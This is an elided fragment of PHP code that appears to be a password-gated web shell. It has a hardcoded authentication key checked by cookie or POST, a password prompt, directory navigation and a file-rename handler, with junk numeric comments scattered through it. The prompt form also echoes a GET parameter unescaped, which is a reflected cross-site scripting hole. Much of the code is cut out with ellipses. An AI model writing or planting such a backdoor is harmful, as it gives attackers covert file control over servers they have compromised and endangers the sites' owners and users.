...
$auth_key = "cf333e3bd9364572e763ae0372ae62d1";
...
$pass = false;
if (isset($_COOKIE['pw_name_19442'])) {
    if(($_COOKIE['pw_name_19442']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_19442'])) {
        if(($_POST['pw_name_19442']) == $auth_key) {
            setcookie("pw_name_19442", $_POST['pw_name_19442']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_19442' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774491078 1724682774344726 1724682774441128 1724682774857709
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774491078 1724682774344726 1724682774441128 1724682774857709
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774491078 1724682774344726 1724682774441128 1724682774857709
            $name = PATH . "/" . $_GET['r'];
